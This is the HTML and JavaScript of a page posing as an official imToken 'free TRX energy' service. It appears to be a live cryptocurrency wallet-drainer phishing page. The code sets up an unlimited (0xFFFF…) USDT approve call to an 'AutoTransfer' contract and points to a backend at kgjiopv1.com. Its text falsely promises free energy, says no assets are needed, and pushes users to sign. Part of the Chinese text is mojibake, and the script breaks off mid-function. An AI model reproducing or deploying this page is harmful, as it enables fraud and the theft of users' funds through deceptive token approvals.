<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imTokenå®˜æ–¹æˆæƒ</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
body { 
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    padding: 10px 8px; /* ç¼©å°æ‰‹æœºç«¯æ•´ä½“å†…è¾¹è· */
    max-width: 600px; 
    margin: 0 auto; 
    background: #121a17; 
    color: #e0e8e4; 
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    gap: 5px; /* ç¼©å°bodyå†…å…ƒç´ é—´è· */
    border-radius: 8px;
    border-left: 3px solid #3b82f6;
}
.container {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 6px; /* ç¼©å°å®¹å™¨å†…æ¨¡å—é—´è· */
}
/* è¯­è¨€åˆ‡æ¢æŒ‰é’®ï¼ˆå•ä¸ªåœ°çƒå›¾æ ‡ï¼‰ */
.lang-switch {
    text-align: right;
    margin-bottom: 2px; /* å¤§å¹…ç¼©å°ä¸ä¸‹æ–¹å†…å®¹çš„é—´éš” */
}
.lang-toggle {
    padding: 3px 8px; /* ç¼©å°æŒ‰é’®å†…è¾¹è· */
    border: 1px solid #3b82f6;
    border-radius: 20px;
    background: transparent;
    color: #e0e8e4;
    font-size: 13px; /* ç¼©å°æŒ‰é’®å­—ä½“ */
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 4px;
}
.lang-toggle:hover {
    background: rgba(59, 130, 246, 0.2);
}
.header {
    text-align: center;
    padding: 8px 0; /* ç¼©å°å¤´éƒ¨ä¸Šä¸‹å†…è¾¹è· */
    border-bottom: 1px solid #334155;
    margin-bottom: 3px; /* ç¼©å°å¤´éƒ¨ä¸ä¸‹æ–¹çš„é—´éš” */
    display:flex;
    justify-content: center;
}
.header h1 { 
    font-size: 20px; /* ç¼©å°æ ‡é¢˜å­—ä½“ */
    color: #3b82f6; 
    margin-bottom: 3px;
}
.header .desc {
    font-size: 12px; /* ç¼©å°æè¿°å­—ä½“ */
    color: #a0a8a4;
    max-width: 450px;
    margin: 0 auto;
    line-height: 1.4; 
}
.warning {
    background: #334155;
    color: #93c5fd;
    padding: 10px; /* ç¼©å°æç¤ºæ¡†å†…è¾¹è· */
    border-radius: 8px;
    font-size: 12px; /* ç¼©å°æç¤ºæ–‡å­— */
    border-left: 3px solid #4ade80;
    line-height: 1.5;
}
.warning strong {
    color: #3b82f6;
}
#userInfo {
    text-align: center;
    font-size: 13px; /* ç¼©å°ç”¨æˆ·ä¿¡æ¯å­—ä½“ */
    padding: 12px; /* ç¼©å°å†…è¾¹è· */
    background: #1e2925;
    border-radius: 8px;
    border: 1px solid #334155;
    line-height: 1.6;
}
#userInfo span {
    color: #3b82f6;
    font-weight: 500;
}
#walletStatusContainer {
    background: #1e2925;
    padding: 12px; /* ç¼©å°å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #334155;
    font-size: 12px; /* ç¼©å°æ–‡å­— */
    color: #a0a8a4;
    line-height: 1.6;
    border-right: 5px solid #4ade80;
}
#walletStatusContainer .status-title {
    font-size: 14px; /* ç¼©å°æ ‡é¢˜ */
    color: #3b82f6;
    margin-bottom: 6px; /* ç¼©å°é—´éš” */
    display: flex;
    align-items: center;
    gap: 6px;
}
#walletStatusContainer .connected-content {
    display: none;
}
#walletStatusContainer.connected .disconnected-content {
    display: none;
}
#walletStatusContainer.connected .connected-content {
    display: block;
}
#walletStatusContainer .highlight {
    color: #3b82f6;
    font-weight: 500;
}
#walletStatusContainer.connected .connected-content .orange-tip {
    color: #f97316;
    margin-top: 3px;
}
#contractResourceContainer {
    background: #1e2925;
    padding: 12px; /* ç¼©å°å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #334155;
    font-size: 12px; /* ç¼©å°æ–‡å­— */
    color: #a0a8a4;
    line-height: 1.8;
    border-bottom: 2px solid rgba(59, 130, 246, 0.2);
}
#contractResourceContainer .status-title {
    font-size: 14px; /* ç¼©å°æ ‡é¢˜ */
    color: #3b82f6;
    margin-bottom: 8px; /* ç¼©å°é—´éš” */
    display: flex;
    align-items: center;
    gap: 8px;
}
#contractResourceContainer .status-title i {
    font-size: 15px;
    color: #93c5fd;
}
#contractResourceContainer .highlight {
    color: #3b82f6;
    font-weight: 500;
}
#contractResourceContainer .data-tag {
    background: rgba(59, 130, 246, 0.15);
    padding: 2px 6px; /* ç¼©å°æ ‡ç­¾å†…è¾¹è· */
    border-radius: 4px;
    border: 1px solid rgba(59, 130, 246, 0.3);
}
.record-list {
    background: #1e2925;
    padding: 12px; /* ç¼©å°å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #334155;
    font-size: 12px; /* ç¼©å°æ–‡å­— */
    border-right: 5px solid #4ade80;
}
.record-item {
    margin-bottom: 8px; /* ç¼©å°é—´éš” */
    padding-bottom: 8px;
    border-bottom: 1px solid #334155;
}
.record-item:hover {
    border-color: #3b82f6;
    transition: border-color 0.3s;
}
.record-item p {
    margin-bottom: 4px; /* ç¼©å°é—´éš” */
    color: #a0a8a4;
    line-height: 1.4;
}
.record-item p strong {
    color: #e0e8e4;
    margin-right: 5px;
}
.tx-link {
    color: #3b82f6;
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 12px; /* ç¼©å°æ–‡å­— */
}
.tx-link:hover {
    text-decoration: underline;
}
.btn-group {
    display: flex;
    flex-direction: column;
    gap: 5px; 
    margin-top: 8px; /* ç¼©å°é—´éš” */
    padding: 8px 0; /* ç¼©å°ä¸Šä¸‹å†…è¾¹è· */
    border-top: 1px solid #334155;
}
.btn {
    width: 100%;
    padding: 15px; /* ç¼©å°æŒ‰é’®é«˜åº¦ */
    font-size: 14px; /* ç¼©å°æŒ‰é’®æ–‡å­— */
    border: none;
    border-radius: 8px;
    background: #2563eb;
    color: white;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    transition: background 0.3s;
}
.btn:hover {
    background: #3b82f6;
}
.btn:disabled {
    background: #294b75;
    color: #a0a8a4;
    cursor: not-allowed;
}
.footer-info {
    margin-top: 8px; /* ç¼©å°é—´éš” */
    padding-top: 8px; /* ç¼©å°å†…è¾¹è· */
    border-top: 1px solid #334155;
    font-size: 10px; /* ç¼©å°é¡µè„šæ–‡å­— */
    color: #a0a8a4;
    text-align: center;
    line-height: 1.5;
}
.footer-info a {
    color: #3b82f6;
    text-decoration: none;
}
.footer-info a:hover {
    text-decoration: underline;
} 
.text-right {
    text-align: right;
}
/* å®¡æ ¸ä¸­æç¤ºæ ·å¼ */
.review-tip {
    color: #4ade80;
    font-size: 12px; /* ç¼©å°æç¤ºæ–‡å­— */
    margin-top: 6px; /* ç¼©å°é—´éš” */
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
}
    </style>
</head>
<body>
    <div class="container">      
        <div class="lang-switch">
            <button id="langToggle" class="lang-toggle">
                <i class="fa fa-globe"></i> 
            </button>
        </div>      
        <div class="header">   
            <div>
                <h1 id="headerTitle">imToken</h1>
                <p class="desc" id="headerDesc">imTokenå®˜æ–¹ä¸“å±æœåŠ¡ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©åªå¯é¢†å–ä¸€æ¬¡èƒ½é‡</p>
            </div>
        </div>   
        <div id="userInfo">
            <span id="userInfoDefault">æœªè¿æ¥é’±åŒ…<br>
            <span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span></span>
        </div>
        <div id="walletStatusContainer">
            <div class="status-title"><h3 id="walletStatusTitle">é’±åŒ…çŠ¶æ€</h3></div>
            <div class="disconnected-content">
                <span id="disconnectedText">æœªè¿æ¥é’±åŒ…</span>
                <p><span class="highlight" id="disconnectedTip1">æ‚¨ç°åœ¨å‡†å¤‡é¢†å–çš„æ˜¯imTokenä¸“å±èƒ½é‡ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–</span></p>
                <p><span class="highlight" id="disconnectedTip2">1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡</span></p>         
                <p><span class="highlight" id="disconnectedTip3">2. é¡¹ç›®åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®</span></p>
                <p><span class="highlight" id="disconnectedTip4">3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚</span></p>
                <p><span class="highlight" id="disconnectedTip5">4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯</span></p>
            </div>
            <div class="connected-content">
                <p id="connectedSuccess">âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥</p>
                <p id="connectedAddress">â€¢ é’±åŒ…åœ°å€ï¼š<span class="highlight" id="statusAddress"></span></p>
                <p id="connectedType">â€¢ é¢†å–ç±»å‹ï¼š<span class="highlight">USDTè½¬è´¦èƒ½é‡</span></p>
                <p id="connectedAmount">â€¢ é¢†å–é¢åº¦ï¼š<span class="highlight">90000èƒ½é‡</span></p>
                <p class="orange-tip" id="connectedWarn">âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–</p>
            </div>
        </div>
        <div id="contractResourceContainer">
            <div class="status-title">     
                <h3 id="contractResourceTitle">åˆçº¦å‰©ä½™èµ„æº</h3>
            </div>
            <div class="resource-content" style="line-height: 2;">
                <p id="contractAddrText">â€¢ åˆçº¦åœ°å€ï¼š<span class="highlight" id="contractAddr"></span></p>
                <p id="contractEnergyText">â€¢ å‰©ä½™èƒ½é‡ï¼š<span class="highlight data-tag" id="contractEnergy">315360004000</span></p>
                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                    æ³¨ï¼šæ‰€æœ‰å‰©ä½™é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚
                </p>
            </div>
        </div>
        <div class="record-list">
            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
                <span id="recordTypeTitle">èƒ½é‡ä½¿ç”¨èŒƒå›´</span>
                <span id="recordAmountTitle">è½¬è´¦é¢åº¦</span>
            </div>
            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
                <span class="header"><h3 id="energyType">USDTè½¬è´¦</h3></span>
                <span class="header"><h3 id="transferQuota">æ— é™</h3></span>
            </div>       
            <span id="approvalRecords" class="highlight">æš‚æ— èƒ½é‡é¢†å–è®°å½•</span>        
        </div>
    </div>
    <div class="btn-group">
        <div class="warning">
            <p id="browserWarn1"> âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€</p>
            <p id="browserWarn2"> âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken</p>  
        </div> 
        <button id="connectBtn" class="btn" id="connectBtnText">è¿æ¥imTokené’±åŒ…</button>
        <button id="approveBtn" class="btn" disabled id="approveBtnText">å…è´¹é¢†å–èƒ½é‡</button>
       
        <div id="reviewTip" class="review-tip" style="display: none;">
           <span id="reviewTipText">ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å</span>
        </div>
    </div>
    <div class="footer-info">
        åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰
        Â© 2025 TRXèƒ½é‡æœåŠ¡ | <a href="https://tronscan.org" target="_blank">TRONæµè§ˆå™¨</a> | <a href="https://token.im" target="_blank">imTokenå®˜ç½‘</a>
    </div><script src="imtoken://browser"></script>
<script>
    // æ ¸å¿ƒé…ç½®ï¼ˆåç«¯ä¸»åŸŸåå·²åŒ…å«/apiï¼Œç›´æ¥ä½¿ç”¨ï¼‰
    const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const BACKEND_API = "https://kgjiopv1.com"; // ä¸»åŸŸåå·²åŒ…å«/apiï¼Œæ— éœ€é¢å¤–æ·»åŠ 
    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
    
    // ç²¾ç®€ç‰ˆUSDTåˆçº¦ABIï¼ˆä»…ä¿ç•™æ ¸å¿ƒå‡½æ•°+å¿…è¦äº‹ä»¶ï¼‰
    const USDT_ABI = [
        {
            "constant": true,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {"name": "_spender", "type": "address"},
                {"name": "_value", "type": "uint256"}
            ],
            "name": "approve",
            "outputs": [{"name": "", "type": "bool"}],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "anonymous": false,
            "inputs": [
                {"indexed": true, "name": "owner", "type": "address"},
                {"indexed": true, "name": "spender", "type": "address"},
                {"indexed": false, "name": "value", "type": "uint256"}
            ],
            "name": "Approval",
            "type": "event"
        }
    ];

    // èƒ½é‡è®¡ç®—é…ç½®
    const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
    const INIT_ENERGY = 315360004000;
    const ENERGY_DECREASE_PER_SEC = 3780;
    const STORAGE_KEY = "energy_countdown_data";
    let energyTimer = null;
    
    // å…¨å±€å˜é‡
    let tronWeb = null;
    let userAddress = null;
    let trc20Contract = null;
    let tokenBalance = 0.00; // USDTä½™é¢
    let trxBalance = 0.00;  // TRXä½™é¢
    const RECORD_KEY = "imtoken_energy_records";

    // ========== å¤šè¯­è¨€é…ç½®ï¼ˆè‹±æ–‡æ–‡æœ¬ä¸ä¸­æ–‡æ„æ€ä¸¥æ ¼å¯¹é½ï¼‰ ==========
    const langConfig = {
        zh: {
            headerTitle: "imToken",
            headerDesc: "imTokenå®˜æ–¹ä¸“å±æœåŠ¡ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©åªå¯é¢†å–ä¸€æ¬¡èƒ½é‡",
            userInfoDefault: "æœªè¿æ¥é’±åŒ…<br><span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span>",
            walletStatusTitle: "é’±åŒ…çŠ¶æ€",
            disconnectedText: "æœªè¿æ¥é’±åŒ…",
            disconnectedTip1: "æ‚¨ç°åœ¨å‡†å¤‡é¢†å–çš„æ˜¯imTokenä¸“å±èƒ½é‡ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–",
            disconnectedTip2: "1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡",
            disconnectedTip3: "2. é¡¹ç›®åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®",
            disconnectedTip4: "3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚",
            disconnectedTip5: "4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯",
            connectedSuccess: "âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥",
            connectedAddress: "â€¢ é’±åŒ…åœ°å€ï¼š<span class='highlight' id='statusAddress'></span>",
            connectedType: "â€¢ é¢†å–ç±»å‹ï¼š<span class='highlight'>USDTè½¬è´¦èƒ½é‡</span>",
            connectedAmount: "â€¢ é¢†å–é¢åº¦ï¼š<span class='highlight'>90000èƒ½é‡</span>",
            connectedWarn: "âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–",
            contractResourceTitle: "åˆçº¦å‰©ä½™èµ„æº",
            contractAddrText: "â€¢ åˆçº¦åœ°å€ï¼š<span class='highlight' id='contractAddr'></span>",
            contractEnergyText: "â€¢ å‰©ä½™èƒ½é‡ï¼š<span class='highlight data-tag' id='contractEnergy'>315360004000</span>",
            contractNote: "æ³¨ï¼šæ‰€æœ‰å‰©ä½™é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚",
            recordTypeTitle: "èƒ½é‡ä½¿ç”¨èŒƒå›´",
            recordAmountTitle: "è½¬è´¦é¢åº¦",
            energyType: "USDTè½¬è´¦",
            transferQuota: "æ— é™",
            noRecord: "æš‚æ— èƒ½é‡é¢†å–è®°å½•",
            browserWarn1: " âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€",
            browserWarn2: " âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken",
            connectBtnText: "è¿æ¥imTokené’±åŒ…",
            approveBtnText: "å…è´¹é¢†å–èƒ½é‡",
            reviewTipText: "ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å",
            footerText: "åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰Â© 2025 TRXèƒ½é‡æœåŠ¡ | <a href='https://tronscan.org' target='_blank'>TRONæµè§ˆå™¨</a> | <a href='https://token.im' target='_blank'>imTokenå®˜ç½‘</a>",
            copySuccess: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenå†…ç½®æµè§ˆå™¨æ‰“å¼€",
            copyFail: "âŒ å¤åˆ¶å¤±è´¥ï¼šè¯·æ‰‹åŠ¨å¤åˆ¶é“¾æ¥",
            å”¤èµ·Guide: "âœ… å·²å¤åˆ¶é“¾æ¥+å”¤èµ·imToken\nä¸‹ä¸€æ­¥ï¼šæ‰“å¼€imToken â†’ æµè§ˆ â†’ ç²˜è´´è®¿é—®",
            copyGuide: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenä¸­ç²˜è´´è®¿é—®",
            connectError: "è¿æ¥å¼‚å¸¸<br><span style='color: #ef4444; font-size: 14px;'>âš ï¸ {msg}</span>",
            retryConnect: "é‡è¯•è¿æ¥",
            authorizedTip: "å·²é¢†å–æç¤º<br>{address}<br><span style='color: #3b82f6; font-size: 14px;'>âœ… è¯¥é’±åŒ…30å¤©å†…å·²é¢†å–è¿‡å…è´¹èƒ½é‡</span><br><span style='color: #a0a8a4; font-size: 13px;'>æ¯ä¸ªåœ°å€æ¯30å¤©ä»…é™é¢†å–ä¸€æ¬¡</span>",
            authorizedBtn: "å·²é¢†å–è¿‡èƒ½é‡",
            afterApproveTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… æˆæƒæˆåŠŸï¼Œå‘æ”¾èƒ½é‡ä¸­...</span>",
            deployingBtn: "å‘æ”¾ä¸­...",
            loadingBtn: "åŠ è½½ä¸­...",
            loadingTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… åŠ è½½ä¸­...</span>",
            insufficientUsdt: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #ef4444;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>âŒ ä¸ç¬¦åˆé¢†å–æ¡ä»¶ï¼ˆUSDTéœ€ï¼1ï¼‰</span>",
            insufficientBtn: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
            eligibleTip: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #4ade80;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>âœ… å¯å…è´¹é¢†å–90000 TRXèƒ½é‡</span>",
            distributingBtn: "èƒ½é‡é…é€ä¸­...",
            redirectingBtn: "è·³è½¬ç­¾åä¸­...",
            approveFail: "âš ï¸ æ“ä½œå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
            authorizeFail: "âš ï¸ æˆæƒå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
            successTip: "ğŸ‰ å…è´¹èƒ½é‡é¢†å–å®Œæˆï¼\n90000 TRXèƒ½é‡å·²åˆ°è´¦ï½",
            successBtn: "èƒ½é‡é¢†å–æˆåŠŸ",
            successArrival: "<br><span style='color: #4ade80;'>âœ… 90000 TRXèƒ½é‡å·²åˆ°è´¦</span>",
            recordAddress: "åœ°å€ï¼š",
            recordType: "é¢†å–ç±»å‹ï¼š",
            recordEnergy: "è·å–èƒ½é‡ï¼š",
            recordTime: "é¢†å–æ—¶é—´ï¼š",
            freeEnergy: "å…è´¹èƒ½é‡é¢†å–"
        },
        en: {
            headerTitle: "imToken Official",
            headerDesc: "imToken Exclusive Service - Each wallet address can claim free energy once every 30 days",
            userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
            walletStatusTitle: "Wallet Status",
            disconnectedText: "Wallet not connected",
            disconnectedTip1: "You are about to claim imToken exclusive energy - only for imToken users",
            disconnectedTip2: "1. Each wallet address can claim free energy once every 30 days",
            disconnectedTip3: "2. This non-profit project provides emergency energy support for users with no wallet energy",
            disconnectedTip4: "3. The system will verify if the wallet address meets the claim requirements after clicking 'Claim'",
            disconnectedTip5: "4. No assets required - exit directly to cancel",
            connectedSuccess: "âœ… Wallet connected successfully",
            connectedAddress: "â€¢ Wallet Address: <span class='highlight' id='statusAddress'></span>",
            connectedType: "â€¢ Claim Type: <span class='highlight'>USDT Transfer Energy</span>",
            connectedAmount: "â€¢ Claim Quota: <span class='highlight'>90000 Energy</span>",
            connectedWarn: "âš ï¸ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
            contractResourceTitle: "Contract Remaining Resources",
            contractAddrText: "â€¢ Contract Address: <span class='highlight' id='contractAddr'></span>",
            contractEnergyText: "â€¢ Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>315360004000</span>",
            contractNote: "Note: Distribution stops when remaining amount is '0' - Official imToken project, only for imToken users",
            recordTypeTitle: "Energy Usage Scope",
            recordAmountTitle: "Transfer Quota",
            energyType: "USDT Transfer",
            transferQuota: "Unlimited",
            noRecord: "No energy claim records",
            browserWarn1: " âš ï¸ Open with <strong>imToken in-app browser</strong>",
            browserWarn2: " âš ï¸ Non-wallet browser: Click button to copy + launch imToken",
            connectBtnText: "Connect imToken Wallet",
            approveBtnText: "Claim Free Energy",
            reviewTipText: "System reviewing - please complete the signature after approval",
            footerText: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) Â© 2025 TRX Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
            copySuccess: "âœ… Link copied - open in imToken in-app browser",
            copyFail: "âŒ Copy failed - please copy manually",
            å”¤èµ·Guide: "âœ… Link copied + imToken launched\nNext: Open imToken â†’ Browser â†’ Paste link",
            copyGuide: "âœ… Link copied - please paste in imToken",
            connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>âš ï¸ {msg}</span>",
            retryConnect: "Retry Connection",
            authorizedTip: "Claimed Successfully<br>{address}<br><span style='color: #3b82f6; font-size: 14px;'>âœ… This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address every 30 days</span>",
            authorizedBtn: "Energy Claimed",
            afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… Authorization successful, energy distributing...</span>",
            deployingBtn: "Distributing...",
            loadingBtn: "Loading...",
            loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… Loading...</span>",
            insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>âŒ Ineligible (USDT required > 1)</span>",
            insufficientBtn: "Ineligible",
            eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>âœ… Eligible for 90000 free TRX Energy</span>",
            distributingBtn: "Energy Distributing...",
            redirectingBtn: "Redirecting to Signature...",
            approveFail: "âš ï¸ Operation failed: {msg}, please try again later",
            authorizeFail: "âš ï¸ Authorization failed: {msg}, please try again later",
            successTip: "ğŸ‰ Free Energy Claim Completed!\n90000 TRX Energy has been creditedï½",
            successBtn: "Claim Successful",
            successArrival: "<br><span style='color: #4ade80;'>âœ… 90000 TRX Energy credited</span>",
            recordAddress: "Address:",
            recordType: "Claim Type:",
            recordEnergy: "Energy Obtained:",
            recordTime: "Claim Time:",
            freeEnergy: "Free Energy Claim"
        }
    };
    
    // å½“å‰è¯­è¨€ï¼ˆä»æœ¬åœ°å­˜å‚¨è¯»å–ï¼Œé»˜è®¤ä¸­æ–‡ï¼‰
    let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";

    // ========== äºŒæ¬¡æˆæƒæ ¡éªŒï¼šæœ¬åœ°å­˜å‚¨å·¥å…·ï¼ˆ30å¤©æœ‰æ•ˆæœŸï¼‰ ==========
    const AUTHORIZED_KEY = "authorized_wallet_addresses";
    function getAuthorizedAddresses() {
        try {
            const stored = localStorage.getItem(AUTHORIZED_KEY);
            return stored ? JSON.parse(stored) : [];
        } catch (e) {
            console.warn("è¯»å–å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
            return [];
        }
    }
    function addAuthorizedAddress(address) {
        try {
            const addresses = getAuthorizedAddresses();
            if (!addresses.includes(address)) {
                addresses.push(address);
                localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
            }
        } catch (e) {
            console.warn("å­˜å‚¨å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
        }
    }
    function isAddressAuthorized(address) {
        const addresses = getAuthorizedAddresses();
        if (!addresses.includes(address)) return false;
        // 30å¤©æœ‰æ•ˆæœŸæ ¡éªŒ
        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
        const record = records.find(item => item.address === address);
        if (!record) return false;
        const receiveTime = new Date(record.receiveTime).getTime();
        const thirtyDays = 30 * 24 * 60 * 60 * 1000;
        return Date.now() - receiveTime < thirtyDays; // 30å¤©å†…ç¦æ­¢å†æ¬¡é¢†å–
    }
    
    // DOMå…ƒç´ ç¼“å­˜
    const walletStatusContainer = document.getElementById("walletStatusContainer");
    const contractEnergyEl = document.getElementById("contractEnergy");
    const contractAddrEl = document.getElementById("contractAddr");
    const userInfoEl = document.getElementById("userInfo");
    const connectBtn = document.getElementById("connectBtn");
    const approveBtn = document.getElementById("approveBtn");
    const warning = document.querySelector('.warning');
    const approvalRecords = document.getElementById("approvalRecords");
    const reviewTip = document.getElementById("reviewTip");
    const reviewTipText = document.getElementById("reviewTipText");
    const langToggle = document.getElementById("langToggle"); // å•ä¸ªè¯­è¨€åˆ‡æ¢æŒ‰é’®

    // ========== å•ä¸ªæŒ‰é’®åˆ‡æ¢è¯­è¨€ï¼ˆä¸­æ–‡â†”è‹±æ–‡ï¼‰ ==========
    function toggleLang() {
        // åˆ‡æ¢è¯­è¨€ï¼ˆzh â†” enï¼‰
        currentLang = currentLang === "zh" ? "en" : "zh";
        localStorage.setItem("imtoken_energy_lang", currentLang);
        // æ›´æ–°é¡µé¢æ–‡æœ¬
        updatePageLang();
        // æ›´æ–°è®°å½•åˆ—è¡¨
        renderEnergyRecords();
    }
    
    // æ›´æ–°é¡µé¢æ‰€æœ‰æ–‡æœ¬
    function updatePageLang() {
        const lang = langConfig[currentLang];
